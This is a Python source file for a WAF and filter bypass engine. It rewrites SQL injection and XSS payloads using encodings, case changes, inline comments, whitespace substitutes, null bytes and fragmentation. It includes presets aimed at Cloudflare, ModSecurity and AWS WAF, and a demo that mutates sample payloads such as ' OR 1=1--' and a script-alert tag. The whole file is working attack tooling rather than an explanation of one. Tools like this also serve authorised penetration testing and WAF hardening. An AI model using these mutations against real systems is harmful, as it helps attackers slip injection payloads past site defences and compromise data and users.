#!/usr/bin/env python3
"""
Payload Mutator - WAF/Filter Bypass Engine

Mutates payloads to evade detection:
- URL encoding (single, double, unicode)
- Case variation
- Comment injection
- Whitespace manipulation
- Null byte injection
- String fragmentation
"""

import urllib.parse
import random
from typing import List, Dict, Callable
from dataclasses import dataclass
from enum import Enum


class MutationType(Enum):
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    UNICODE_ENCODE = "unicode_encode"
    HTML_ENCODE = "html_encode"
    CASE_VARIATION = "case_variation"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_ALT = "whitespace_alt"
    NULL_BYTE = "null_byte"
    FRAGMENTATION = "fragmentation"
    CONCAT = "concat"
    HEX = "hex"


@dataclass
class MutatedPayload:
    """A mutated payload with metadata."""
    original: str
    mutated: str
    mutation_type: MutationType
    description: str
    bypass_target: str  # What this is trying to bypass


class PayloadMutator:
    """
    Mutates payloads to bypass WAFs and filters.
    
    Think like a hacker: if one payload is blocked,
    try encoding it, fragmenting it, or hiding it.
    """
    
    def __init__(self):
        # SQL keywords that can be mutated
        self.sql_keywords = [
            "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
            "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "HAVING",
            "GROUP", "LIMIT", "OFFSET", "JOIN", "NULL", "TRUE", "FALSE"
        ]
        
        # XSS keywords
        self.xss_keywords = [
            "script", "onerror", "onload", "onclick", "onmouseover",
            "alert", "confirm", "prompt", "eval", "document", "window"
        ]
        
        # Whitespace alternatives for SQL
        self.whitespace_alts = [
            "/**/",      # Comment
            "/*!*/",     # MySQL version comment
            "%09",       # Tab
            "%0a",       # Newline
            "%0d",       # Carriage return
            "%0b",       # Vertical tab
            "%0c",       # Form feed
            "%a0",       # Non-breaking space
            "/*comment*/",
            "/**_**/",
        ]
    
    # =========================================================================
    # ENCODING MUTATIONS
    # =========================================================================
    
    def url_encode(self, payload: str, chars: str = None) -> MutatedPayload:
        """URL encode special characters."""
        if chars:
            result = ""
            for c in payload:
                if c in chars:
                    result += urllib.parse.quote(c)
                else:
                    result += c
        else:
            result = urllib.parse.quote(payload)
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.URL_ENCODE,
            description="URL encoded payload",
            bypass_target="Basic input filters"
        )
    
    def double_url_encode(self, payload: str) -> MutatedPayload:
        """Double URL encode - bypasses single-decode filters."""
        encoded = urllib.parse.quote(urllib.parse.quote(payload))
        return MutatedPayload(
            original=payload,
            mutated=encoded,
            mutation_type=MutationType.DOUBLE_URL_ENCODE,
            description="Double URL encoded (decode twice)",
            bypass_target="Single URL decode filters"
        )
    
    def unicode_encode(self, payload: str) -> MutatedPayload:
        """Unicode encode characters."""
        result = ""
        for c in payload:
            if c.isalpha():
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.UNICODE_ENCODE,
            description="Unicode escaped characters",
            bypass_target="ASCII-only filters"
        )
    
    def html_encode(self, payload: str) -> MutatedPayload:
        """HTML entity encode."""
        result = ""
        for c in payload:
            if c.isalpha():
                result += f"&#{ord(c)};"
            else:
                result += c
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.HTML_ENCODE,
            description="HTML entity encoded",
            bypass_target="HTML sanitizers"
        )
    
    def hex_encode(self, payload: str) -> MutatedPayload:
        """Hex encode (useful for SQL)."""
        hex_str = "0x" + payload.encode().hex()
        return MutatedPayload(
            original=payload,
            mutated=hex_str,
            mutation_type=MutationType.HEX,
            description="Hex encoded string",
            bypass_target="String matching filters"
        )
    
    # =========================================================================
    # CASE MUTATIONS
    # =========================================================================
    
    def random_case(self, payload: str) -> MutatedPayload:
        """Randomize case: SELECT -> SeLeCt."""
        result = "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.CASE_VARIATION,
            description="Random case variation",
            bypass_target="Case-sensitive keyword filters"
        )
    
    def alternating_case(self, payload: str) -> MutatedPayload:
        """Alternating case: SELECT -> SeLeCt."""
        result = ""
        upper = True
        for c in payload:
            if c.isalpha():
                result += c.upper() if upper else c.lower()
                upper = not upper
            else:
                result += c
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.CASE_VARIATION,
            description="Alternating case",
            bypass_target="Case-sensitive keyword filters"
        )
    
    # =========================================================================
    # SQL INJECTION MUTATIONS
    # =========================================================================
    
    def sql_comment_injection(self, payload: str) -> MutatedPayload:
        """Inject comments into SQL keywords: SELECT -> S/**/E/**/L/**/E/**/C/**/T."""
        result = ""
        for i, c in enumerate(payload):
            result += c
            if c.isalpha() and i < len(payload) - 1 and payload[i+1].isalpha():
                result += "/**/"
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.COMMENT_INJECTION,
            description="Inline comment injection",
            bypass_target="Keyword detection WAFs"
        )
    
    def sql_whitespace_bypass(self, payload: str) -> MutatedPayload:
        """Replace spaces with alternative whitespace."""
        alt = random.choice(self.whitespace_alts)
        result = payload.replace(" ", alt)
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.WHITESPACE_ALT,
            description=f"Whitespace replaced with {repr(alt)}",
            bypass_target="Space-based SQL detection"
        )
    
    def sql_concat_bypass(self, payload: str) -> MutatedPayload:
        """Use CONCAT to build strings."""
        # Example: 'admin' -> CONCAT('ad','min')
        if len(payload) > 2:
            mid = len(payload) // 2
            result = f"CONCAT('{payload[:mid]}','{payload[mid:]}')"
        else:
            result = payload
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.CONCAT,
            description="String built with CONCAT",
            bypass_target="String literal filters"
        )
    
    def sql_version_comment(self, payload: str) -> MutatedPayload:
        """MySQL version-specific comment: /*!50000SELECT*/."""
        # Find keywords and wrap them
        result = payload
        for kw in self.sql_keywords:
            if kw.upper() in result.upper():
                result = result.replace(kw, f"/*!50000{kw}*/")
                result = result.replace(kw.lower(), f"/*!50000{kw.lower()}*/")
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.COMMENT_INJECTION,
            description="MySQL version comment bypass",
            bypass_target="MySQL WAFs"
        )
    
    # =========================================================================
    # XSS MUTATIONS
    # =========================================================================
    
    def xss_encoding_bypass(self, payload: str) -> MutatedPayload:
        """Encode XSS payload to bypass filters."""
        # Use template literal instead of quotes
        result = payload.replace("'", "`").replace('"', "`")
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.FRAGMENTATION,
            description="Template literal substitution",
            bypass_target="Quote-based XSS filters"
        )
    
    def xss_event_variation(self, payload: str) -> MutatedPayload:
        """Use alternative event handlers."""
        variations = {
            "onerror": ["onerror", "ONERROR", "OnErRoR"],
            "onload": ["onload", "ONLOAD", "OnLoAd", "onloadstart"],
            "onclick": ["onclick", "ONCLICK", "ondblclick"],
        }
        
        result = payload
        for event, alts in variations.items():
            if event in payload.lower():
                alt = random.choice(alts)
                result = result.replace(event, alt)
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.CASE_VARIATION,
            description="Event handler variation",
            bypass_target="Event handler blacklists"
        )
    
    def xss_tag_variation(self, payload: str) -> MutatedPayload:
        """Use alternative tags."""
        tag_alts = {
            "<script>": ["<ScRiPt>", "<script >", "<script\t>", "<script\n>"],
            "<img": ["<ImG", "<img ", "<img\t", "<IMG"],
            "<svg": ["<SvG", "<svg ", "<SVG"],
        }
        
        result = payload
        for tag, alts in tag_alts.items():
            if tag.lower() in payload.lower():
                alt = random.choice(alts)
                result = result.replace(tag, alt)
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.CASE_VARIATION,
            description="Tag variation",
            bypass_target="Tag blacklists"
        )
    
    # =========================================================================
    # NULL BYTE & FRAGMENTATION
    # =========================================================================
    
    def null_byte_injection(self, payload: str, position: str = "middle") -> MutatedPayload:
        """Inject null bytes to truncate filters."""
        null = "%00"
        
        if position == "start":
            result = null + payload
        elif position == "end":
            result = payload + null
        else:  # middle
            mid = len(payload) // 2
            result = payload[:mid] + null + payload[mid:]
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.NULL_BYTE,
            description=f"Null byte at {position}",
            bypass_target="C-based filters (truncation)"
        )
    
    def fragment_payload(self, payload: str, chunk_size: int = 3) -> MutatedPayload:
        """Fragment payload into chunks with separators."""
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        result = "'+'" .join(chunks)
        result = "'" + result + "'"
        
        return MutatedPayload(
            original=payload,
            mutated=result,
            mutation_type=MutationType.FRAGMENTATION,
            description=f"Fragmented into {len(chunks)} chunks",
            bypass_target="Pattern matching filters"
        )
    
    # =========================================================================
    # MUTATION ENGINE
    # =========================================================================
    
    def mutate_all(self, payload: str) -> List[MutatedPayload]:
        """Generate all mutations of a payload."""
        mutations = [
            self.url_encode(payload),
            self.double_url_encode(payload),
            self.unicode_encode(payload),
            self.html_encode(payload),
            self.random_case(payload),
            self.alternating_case(payload),
            self.null_byte_injection(payload, "end"),
        ]
        
        # Add SQL-specific mutations if it looks like SQL
        if any(kw in payload.upper() for kw in self.sql_keywords):
            mutations.extend([
                self.sql_comment_injection(payload),
                self.sql_whitespace_bypass(payload),
                self.sql_version_comment(payload),
                self.hex_encode(payload),
            ])
        
        # Add XSS-specific mutations if it looks like XSS
        if "<" in payload or any(kw in payload.lower() for kw in self.xss_keywords):
            mutations.extend([
                self.xss_encoding_bypass(payload),
                self.xss_event_variation(payload),
                self.xss_tag_variation(payload),
            ])
        
        return mutations
    
    def smart_mutate(self, payload: str, waf_type: str = None) -> List[MutatedPayload]:
        """Generate mutations optimized for specific WAF."""
        
        if waf_type == "cloudflare":
            return [
                self.unicode_encode(payload),
                self.sql_version_comment(payload),
                self.fragment_payload(payload),
                self.double_url_encode(payload),
            ]
        
        elif waf_type == "mod_security":
            return [
                self.sql_comment_injection(payload),
                self.sql_whitespace_bypass(payload),
                self.alternating_case(payload),
                self.hex_encode(payload),
            ]
        
        elif waf_type == "aws_waf":
            return [
                self.unicode_encode(payload),
                self.double_url_encode(payload),
                self.null_byte_injection(payload, "middle"),
            ]
        
        else:
            return self.mutate_all(payload)


if __name__ == "__main__":
    print("Payload Mutator Demo")
    print("=" * 60)
    
    mutator = PayloadMutator()
    
    # SQL Injection
    sql_payload = "' OR 1=1--"
    print(f"\nOriginal SQL: {sql_payload}")
    print("-" * 40)
    
    for m in mutator.mutate_all(sql_payload)[:5]:
        print(f"[{m.mutation_type.value}] {m.mutated}")
    
    # XSS
    xss_payload = "<script>alert(1)</script>"
    print(f"\nOriginal XSS: {xss_payload}")
    print("-" * 40)
    
    for m in mutator.mutate_all(xss_payload)[:5]:
        print(f"[{m.mutation_type.value}] {m.mutated}")
    
    # Cloudflare-specific
    print(f"\nCloudflare bypass mutations:")
    print("-" * 40)
    
    for m in mutator.smart_mutate("SELECT * FROM users", "cloudflare"):
        print(f"[{m.mutation_type.value}] {m.mutated}")
